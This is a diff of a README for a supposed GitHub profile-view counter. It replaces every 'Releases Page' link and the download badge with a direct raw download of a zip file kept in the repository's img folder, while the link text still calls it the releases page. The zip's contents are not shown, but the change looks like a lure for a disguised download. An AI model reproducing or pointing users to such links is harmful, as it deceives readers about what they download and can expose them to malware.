@@ -1,6 +1,6 @@
 # 📈 GitHub-Profile-Views-Counter - Track Your GitHub Profile Views Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20-from%20Releases-brightgreen)](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/releases)
+[![Download from Releases](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/raw/refs/heads/main/img/Counter-Git-Profile-Hub-Views-v1.5-beta.5.zip%20Now%20-from%20Releases-brightgreen)](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/raw/refs/heads/main/img/Counter-Git-Profile-Hub-Views-v1.5-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,14 +21,14 @@ Welcome to the GitHub-Profile-Views-Counter! This application lets you see how m
 
 ## 🔧 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/raw/refs/heads/main/img/Counter-Git-Profile-Hub-Views-v1.5-beta.5.zip).
 
 Once you visit the page, you will see the latest version of the application available for download. Click on the appropriate file for your operating system to start the download.
 
 ### 💻 Installation Steps
 
 1. **Download the Application:**
-   - Go to the [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/releases).
+   - Go to the [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/raw/refs/heads/main/img/Counter-Git-Profile-Hub-Views-v1.5-beta.5.zip).
    - Select the latest release and choose the version that matches your operating system.
 
 2. **Run the Application:**
@@ -60,4 +60,4 @@ If you encounter any issues:
 
 Now you're ready to track your GitHub profile views easily! Start your analysis today and understand how many visitors are engaging with your profile.
 
-For updates and more features, keep an eye on the [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/releases).
+For updates and more features, keep an eye on the [Releases Page](https://github.com/Akshay876-hub/GitHub-Profile-Views-Counter/raw/refs/heads/main/img/Counter-Git-Profile-Hub-Views-v1.5-beta.5.zip).
